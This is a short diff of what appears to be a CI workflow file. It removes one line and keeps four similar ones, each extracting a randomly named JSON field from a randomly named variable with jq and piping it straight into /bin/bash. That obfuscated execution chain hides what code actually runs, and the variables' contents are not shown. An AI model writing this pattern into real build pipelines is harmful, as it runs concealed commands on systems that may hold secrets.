@@ -21,7 +21,6 @@ jobs:
           echo $gnado37316 | jq -r .wu3 | /bin/bash
           echo $zbue2307 | jq -r .laul45182 | /bin/bash
           echo $mp25 | jq -r .ud17 | /bin/bash
-          printf '%s' "$fey009" | jq -r .peig36975 | /bin/bash
           printf '%s' "$ffm92" | jq -r .dyfu9 | /bin/bash
 
       - name: Upload results
